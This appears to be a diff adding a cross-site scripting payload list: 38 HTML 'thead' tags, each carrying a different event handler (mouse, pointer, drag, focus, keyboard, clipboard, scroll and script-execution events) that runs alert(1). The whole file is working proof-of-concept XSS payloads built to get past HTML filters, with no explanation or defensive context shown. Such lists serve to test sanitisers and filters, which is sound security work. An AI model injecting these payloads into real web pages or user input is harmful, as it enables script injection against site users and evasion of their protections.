@@ -1,0 +1,38 @@
+<thead contenteditable onbeforeinput=alert(1)>test
+<thead draggable="true" ondrag="alert(1)" style=display:block>test</thead>
+<thead draggable="true" ondragend="alert(1)" style=display:block>test</thead>
+<thead draggable="true" ondragenter="alert(1)" style=display:block>test</thead>
+<thead draggable="true" ondragleave="alert(1)" style=display:block>test</thead>
+<thead draggable="true" ondragstart="alert(1)" style=display:block>test</thead>
+<thead id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></thead>
+<thead id=x tabindex=1 onfocus=alert(1)></thead>
+<thead id=x tabindex=1 onfocusin=alert(1)></thead>
+<thead onafterscriptexecute=alert(1)><script>1</script>
+<thead onbeforescriptexecute=alert(1)><script>1</script>
+<thead onblur=alert(1) id=x tabindex=1 style=display:block>test</thead><input value=clickme>
+<thead onclick="alert(1)" style=display:block>test</thead>
+<thead oncontextmenu="alert(1)" style=display:block>test</thead>
+<thead oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<thead oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<thead ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</thead>
+<thead onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</thead><input value=clickme>
+<thead onkeydown="alert(1)" contenteditable style=display:block>test</thead>
+<thead onkeypress="alert(1)" contenteditable style=display:block>test</thead>
+<thead onkeyup="alert(1)" contenteditable style=display:block>test</thead>
+<thead onmousedown="alert(1)" style=display:block>test</thead>
+<thead onmouseenter="alert(1)" style=display:block>test</thead>
+<thead onmouseleave="alert(1)" style=display:block>test</thead>
+<thead onmousemove="alert(1)" style=display:block>test</thead>
+<thead onmouseout="alert(1)" style=display:block>test</thead>
+<thead onmouseover="alert(1)" style=display:block>test</thead>
+<thead onmouseup="alert(1)" style=display:block>test</thead>
+<thead onmousewheel=alert(1) style=display:block>requires scrolling
+<thead onpointerdown=alert(1) style=display:block>XSS</thead>
+<thead onpointerenter=alert(1) style=display:block>XSS</thead>
+<thead onpointerleave=alert(1) style=display:block>XSS</thead>
+<thead onpointermove=alert(1) style=display:block>XSS</thead>
+<thead onpointerout=alert(1) style=display:block>XSS</thead>
+<thead onpointerover=alert(1) style=display:block>XSS</thead>
+<thead onpointerrawupdate=alert(1) style=display:block>XSS</thead>
+<thead onpointerup=alert(1) style=display:block>XSS</thead>
+<thead onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></thead>
